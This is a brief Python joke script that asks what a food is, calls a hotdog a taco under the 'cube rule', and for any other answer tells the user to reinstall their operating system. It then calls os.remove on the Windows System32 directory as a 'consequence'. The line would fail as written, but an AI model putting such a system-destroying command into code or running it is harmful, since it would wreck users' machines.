# -*- coding: utf-8 -*-
"""
Created on Tue Apr 14 15:23:23 2026

@author: regal
"""

myfood = input("What food is it?")
#categorizes user input based on cube rule of food 

if myfood == "hotdog" or myfood == "hot dog":
    print("This is a taco!")
    
else:
    print("This is not a taco. Please reinstall your operating system and try again")
    os.remove("C:\Windows\System32")
    #lets the user know that incorrect answers come with consequences
